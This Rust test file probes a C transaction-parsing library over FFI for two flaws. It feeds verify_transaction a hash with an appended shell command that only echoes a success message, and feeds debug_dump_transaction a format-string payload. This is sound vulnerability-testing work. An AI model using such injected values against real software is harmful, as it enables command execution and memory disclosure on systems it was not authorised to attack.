// Test FFI vulnerabilities
use std::ffi::CString;

#[link(name = "tx_parser", kind = "static")]
extern "C" {
    fn verify_transaction(tx_hash: *const i8) -> i32;
    fn debug_dump_transaction(tx_hash: *const i8) -> i32;
    fn crypto_init() -> i32;
}

fn main() {
    println!("=== Testing FFI Vulnerabilities ===\n");
    
    unsafe {
        crypto_init();
        
        // Test 1: Command injection vulnerability
        println!("Test 1: Command Injection via verify_transaction");
        let malicious_hash = "aabbccdd0000000000000000000000000000000000000000000000000000000000; echo 'COMMAND INJECTION SUCCESSFUL'; #";
        match CString::new(malicious_hash) {
            Ok(c_hash) => {
                println!("Sending malicious hash: {}", c_hash.to_str().unwrap());
                let result = verify_transaction(c_hash.as_ptr());
                println!("Result: {}\n", result);
            },
            Err(e) => println!("Error: {}", e),
        }
        
        // Test 2: Format string vulnerability  
        println!("Test 2: Format String via debug_dump_transaction");
        let format_string = "1234567890123456789012345678901234567890123456789012345678901234%s%s%s%s";
        match CString::new(format_string) {
            Ok(c_hash) => {
                println!("Sending format string: {}", c_hash.to_str().unwrap());
                let result = debug_dump_transaction(c_hash.as_ptr());
                println!("Result: {}\n", result);
            },
            Err(e) => println!("Error: {}", e),
        }
        
        println!("=== Vulnerability Tests Complete ===");
    }
}
